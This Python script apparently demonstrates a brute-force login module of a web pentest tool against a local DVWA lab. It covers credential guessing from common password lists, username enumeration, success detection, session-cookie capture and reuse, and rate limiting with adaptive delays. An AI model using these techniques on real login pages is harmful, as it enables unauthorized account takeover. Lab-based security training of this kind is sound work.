"""Demo script for brute-force login module

This script demonstrates:
1. Basic brute-force attack
2. Username enumeration
3. Different success detection methods
4. Session capture
5. Rate limiting and adaptive timing
"""

import asyncio
from app.core.request_handler import RequestHandler
from app.core.session_manager import SessionManager
from app.core.payload_engine import PayloadEngine
from app.modules.brute_force import (
    BruteForceAttack,
    BruteForceTester,
    LoginConfig,
    LoginMethod,
    SuccessDetectionMethod,
)


async def demo_basic_brute_force():
    """Demonstrate basic brute-force attack"""
    print("\n" + "=" * 60)
    print("Demo 1: Basic Brute-Force Attack")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    session_manager = SessionManager()
    attack = BruteForceAttack(request_handler, session_manager)
    
    # Configure login (example with DVWA)
    config = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.REGEX,
        success_regex=r"Welcome|Dashboard|Logout",
        failure_regex=r"Login failed",
        delay_between_attempts=0.5,
        adaptive_delay=True,
        max_concurrent=3,
        additional_data={
            "Login": "Login",
        },
    )
    
    # Test credentials
    usernames = ["admin", "user", "test"]
    passwords = ["password", "admin", "123456"]
    
    print(f"\n[*] Testing {len(usernames)} usernames with {len(passwords)} passwords")
    print(f"[*] Total attempts: {len(usernames) * len(passwords)}")
    
    # Execute attack
    results = await attack.attack(
        config,
        usernames,
        passwords,
        enumerate_first=False,  # Skip enumeration for demo
    )
    
    # Display results
    print(f"\n[+] Attack completed!")
    print(f"[+] Total attempts: {results['total_attempts']}")
    print(f"[+] Successful logins: {results['successful_attempts']}")
    
    if results['successful_logins']:
        print("\n[+] Valid credentials found:")
        for login in results['successful_logins']:
            print(f"    Username: {login['username']}")
            print(f"    Password: {login['password']}")
            print(f"    Session ID: {login['session_id']}")
            print(f"    Response time: {login['response_time']:.2f}s")
            print()


async def demo_username_enumeration():
    """Demonstrate username enumeration"""
    print("\n" + "=" * 60)
    print("Demo 2: Username Enumeration")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    session_manager = SessionManager()
    tester = BruteForceTester(request_handler, session_manager)
    
    # Configure login
    config = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        delay_between_attempts=0.3,
    )
    
    # Test usernames
    usernames = ["admin", "administrator", "user", "guest", "test", "root"]
    
    print(f"\n[*] Enumerating {len(usernames)} usernames...")
    
    # Enumerate usernames
    results = await tester.enumerate_usernames(config, usernames)
    
    # Display results
    print("\n[+] Enumeration completed!")
    print("\n[+] Results:")
    
    for result in results:
        status = "✓ VALID" if result.exists else "✗ Invalid"
        confidence = result.confidence * 100
        
        print(f"\n  {status} - {result.username} (confidence: {confidence:.1f}%)")
        print(f"    Response time: {result.response_time:.3f}s")
        print(f"    Content length: {result.content_length}")
        
        if result.evidence:
            print(f"    Evidence:")
            for evidence in result.evidence[:3]:  # Show first 3 pieces of evidence
                print(f"      - {evidence}")


async def demo_success_detection_methods():
    """Demonstrate different success detection methods"""
    print("\n" + "=" * 60)
    print("Demo 3: Success Detection Methods")
    print("=" * 60)
    
    request_handler = RequestHandler()
    session_manager = SessionManager()
    tester = BruteForceTester(request_handler, session_manager)
    
    # Test credentials
    username = "admin"
    password = "password"
    
    # Method 1: Regex detection
    print("\n[*] Testing with Regex detection...")
    config_regex = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.REGEX,
        success_regex=r"Welcome|Dashboard",
        failure_regex=r"Login failed|incorrect",
    )
    
    result = await tester._test_credentials(config_regex, username, password)
    print(f"  Result: {'SUCCESS' if result.success else 'FAILED'}")
    print(f"  Status: {result.status_code}")
    print(f"  Response time: {result.response_time:.2f}s")
    
    # Method 2: Status code detection
    print("\n[*] Testing with Status Code detection...")
    config_status = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.STATUS_CODE,
        success_status_codes=[200, 302],
    )
    
    result = await tester._test_credentials(config_status, username, password)
    print(f"  Result: {'SUCCESS' if result.success else 'FAILED'}")
    print(f"  Status: {result.status_code}")
    
    # Method 3: Redirect detection
    print("\n[*] Testing with Redirect detection...")
    config_redirect = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.REDIRECT,
    )
    
    result = await tester._test_credentials(config_redirect, username, password)
    print(f"  Result: {'SUCCESS' if result.success else 'FAILED'}")
    print(f"  Status: {result.status_code}")
    print(f"  Has redirect: {result.status_code in [301, 302, 303, 307, 308]}")
    
    # Method 4: Cookie detection
    print("\n[*] Testing with Cookie detection...")
    config_cookie = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.COOKIE,
    )
    
    result = await tester._test_credentials(config_cookie, username, password)
    print(f"  Result: {'SUCCESS' if result.success else 'FAILED'}")
    print(f"  Session captured: {result.session is not None}")
    if result.session:
        print(f"  Cookies: {list(result.session.cookies.keys())}")


async def demo_session_capture():
    """Demonstrate automatic session capture"""
    print("\n" + "=" * 60)
    print("Demo 4: Automatic Session Capture")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    session_manager = SessionManager()
    attack = BruteForceAttack(request_handler, session_manager)
    
    # Configure login
    config = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.REGEX,
        success_regex=r"Welcome|Dashboard",
    )
    
    # Test with known credentials
    usernames = ["admin"]
    passwords = ["password"]
    
    print("\n[*] Attempting login with admin:password...")
    
    # Execute attack
    results = await attack.attack(config, usernames, passwords, enumerate_first=False)
    
    if results['successful_logins']:
        login = results['successful_logins'][0]
        session_id = login['session_id']
        
        print(f"\n[+] Login successful!")
        print(f"[+] Session ID: {session_id}")
        print(f"[+] Cookies captured:")
        
        # Get session from manager
        session = session_manager._sessions.get(session_id)
        if session:
            for cookie_name, cookie in session.cookies.items():
                print(f"    {cookie_name} = {cookie.value}")
                print(f"      Domain: {cookie.domain}")
                print(f"      Path: {cookie.path}")
                print(f"      Secure: {cookie.secure}")
                print(f"      HttpOnly: {cookie.http_only}")
            
            # Demonstrate using captured session
            print("\n[*] Using captured session for authenticated request...")
            
            cookies = session.get_cookies_for_request("http://localhost/dvwa/")
            response = await request_handler.send_request(
                method="GET",
                url="http://localhost/dvwa/index.php",
                cookies=cookies,
            )
            
            print(f"[+] Authenticated request successful!")
            print(f"    Status: {response.status_code}")
            print(f"    Content length: {len(response.text)}")


async def demo_rate_limiting():
    """Demonstrate rate limiting and adaptive timing"""
    print("\n" + "=" * 60)
    print("Demo 5: Rate Limiting and Adaptive Timing")
    print("=" * 60)
    
    request_handler = RequestHandler()
    session_manager = SessionManager()
    attack = BruteForceAttack(request_handler, session_manager)
    
    # Configure with rate limiting
    config = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.REGEX,
        failure_regex=r"Login failed",
        requests_per_second=2.0,  # Limit to 2 requests per second
        max_concurrent=1,  # Sequential requests
        adaptive_delay=True,
        max_delay=3.0,
    )
    
    # Small test set
    usernames = ["admin", "user"]
    passwords = ["test1", "test2", "test3"]
    
    print(f"\n[*] Testing with rate limit: 2 requests/second")
    print(f"[*] Expected duration: ~{len(usernames) * len(passwords) / 2:.1f} seconds")
    
    import time
    start_time = time.time()
    
    # Execute attack
    results = await attack.attack(config, usernames, passwords, enumerate_first=False)
    
    elapsed = time.time() - start_time
    
    print(f"\n[+] Attack completed in {elapsed:.1f} seconds")
    print(f"[+] Average time per attempt: {elapsed / results['total_attempts']:.2f}s")


async def demo_with_wordlists():
    """Demonstrate using wordlists from Payload Engine"""
    print("\n" + "=" * 60)
    print("Demo 6: Using Wordlists")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    session_manager = SessionManager()
    payload_engine = PayloadEngine()
    attack = BruteForceAttack(request_handler, session_manager, payload_engine)
    
    # Create sample wordlists
    print("\n[*] Creating sample wordlists...")
    
    # Add usernames
    sample_usernames = ["admin", "administrator", "user", "guest", "test"]
    for username in sample_usernames:
        payload_engine.add_custom_payload(username, "usernames")
    
    # Add passwords
    sample_passwords = ["password", "admin", "123456", "letmein", "welcome"]
    for password in sample_passwords:
        payload_engine.add_custom_payload(password, "passwords")
    
    # Get payloads from engine
    usernames = [p.encoded for p in payload_engine.get_payloads("usernames")]
    passwords = [p.encoded for p in payload_engine.get_payloads("passwords")]
    
    print(f"[+] Loaded {len(usernames)} usernames")
    print(f"[+] Loaded {len(passwords)} passwords")
    
    # Configure attack
    config = LoginConfig(
        url="http://localhost/dvwa/login.php",
        method=LoginMethod.POST,
        username_param="username",
        password_param="password",
        success_detection=SuccessDetectionMethod.REGEX,
        success_regex=r"Welcome|Dashboard",
        delay_between_attempts=0.3,
        max_concurrent=3,
    )
    
    print(f"\n[*] Starting attack with {len(usernames) * len(passwords)} combinations...")
    
    # Execute attack
    results = await attack.attack(config, usernames, passwords, enumerate_first=True)
    
    print(f"\n[+] Attack completed!")
    print(f"[+] Successful logins: {results['successful_attempts']}")
    
    if results['successful_logins']:
        for login in results['successful_logins']:
            print(f"    {login['username']}:{login['password']}")


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("Brute-Force Login Module - Demo Suite")
    print("=" * 60)
    print("\nNOTE: These demos require a vulnerable target (e.g., DVWA)")
    print("      Adjust URLs and parameters as needed for your environment")
    
    try:
        # Run demos
        await demo_basic_brute_force()
        await demo_username_enumeration()
        await demo_success_detection_methods()
        await demo_session_capture()
        await demo_rate_limiting()
        await demo_with_wordlists()
        
        print("\n" + "=" * 60)
        print("All demos completed!")
        print("=" * 60)
    
    except Exception as e:
        print(f"\n[!] Error running demos: {e}")
        print("[!] Make sure you have a vulnerable target running")
        print("[!] Example: DVWA at http://localhost/dvwa/")


if __name__ == "__main__":
    asyncio.run(main())
